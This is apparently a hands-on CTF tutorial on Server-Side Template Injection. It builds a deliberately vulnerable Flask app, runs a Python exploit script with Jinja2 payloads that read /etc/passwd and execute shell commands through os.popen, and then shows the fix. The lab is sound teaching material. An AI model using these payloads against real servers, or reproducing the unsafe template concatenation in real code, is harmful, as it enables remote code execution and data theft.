---
title: '06 - Hands-on Lab: Server-Side Template Injection (SSTI) 🧪'
description: In this lab, you will deploy a vulnerable Python Flask application locally,
  exploit it to extract the flag, and then apply the proper security remedia...
keywords:
- AppSec
- Cybersecurity
- Security
- Guide
- Tutorial
- '05'
- Offensive
- Ctf
- Guide
- '06'
- Hands
- 'On'
- Lab
- Md
slug: /offensive/ctf-guide/hands-on-lab
---


# 06 - Hands-on Lab: Server-Side Template Injection (SSTI) 🧪

In this lab, you will deploy a vulnerable Python Flask application locally, exploit it to extract the flag, and then apply the proper security remediation.

---

## 1. The Vulnerable Application

Create a file named `app.py`. This app greets the user but unsafely passes user input directly into the Jinja2 template engine.

```python
# app.py
from flask import Flask, request, render_template_string
import os

app = Flask(__name__)

# Fake flag file setup for the lab
with open('flag.txt', 'w') as f:
    f.write('flag{ssti_is_danger0us}')

@app.route("/")
def home():
    name = request.args.get('name', 'Guest')
    # VULNERABILITY: User input 'name' is concatenated into the template string!
    template = f"<h1>Hello, {name}!</h1>"
    return render_template_string(template)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```

**Run the app:**
```bash
pip install flask
python app.py
```
Visit: `http://localhost:5000/?name=Hacker`

---

## 2. Exploitation (The Attack)

Because the input is interpreted as a template, we can inject Jinja2 expressions (`{{ }}`).

**Test Payload:**
Visit: `http://localhost:5000/?name={{7*7}}`
Notice the page says **Hello, 49!** — The server executed the math. We have SSTI!

### Automated Python Exploit Script

Save this as `exploit.py` and run it against the local server to extract the flag automatically via Remote Code Execution (RCE).

```python
# exploit.py
import requests

url = "http://localhost:5000/"

# Jinja2 payload to navigate the MRO (Method Resolution Order) to find the 'os' module
# and execute system commands (cat flag.txt).
payload = "{{ request.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}"
# A more reliable Python3/Jinja2 RCE payload:
rce_payload = "{{ config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read() }}"

params = {'name': rce_payload}

print("[*] Sending malicious payload...")
response = requests.get(url, params=params)

# Parse out the flag from the response
if "flag{" in response.text:
    print("[+] SUCCESS! Exploit executed.")
    # Quick string manipulation to extract just the flag
    start = response.text.find('flag{')
    end = response.text.find('}', start) + 1
    print(f"[*] Retrieved Flag: {response.text[start:end]}")
else:
    print("[-] Exploit failed.")
```

**Output:**
```text
[*] Sending malicious payload...
[+] SUCCESS! Exploit executed.
[*] Retrieved Flag: flag{ssti_is_danger0us}
```

---

## 3. The Secure Fix (Remediation)

To fix SSTI, **never** concatenate user input directly into template strings. Instead, pass the variable as context to the template engine.

**Fixed `app.py`:**
```python
@app.route("/")
def home():
    name = request.args.get('name', 'Guest')
    # SECURE: Template is static. Input is passed as a variable context.
    template = "<h1>Hello, {{ user_name }}!</h1>"
    return render_template_string(template, user_name=name)
```

If you re-run the exploit script against the fixed code, the template engine safely escapes the input, rendering the literal text `{{ config... }}` instead of executing it!
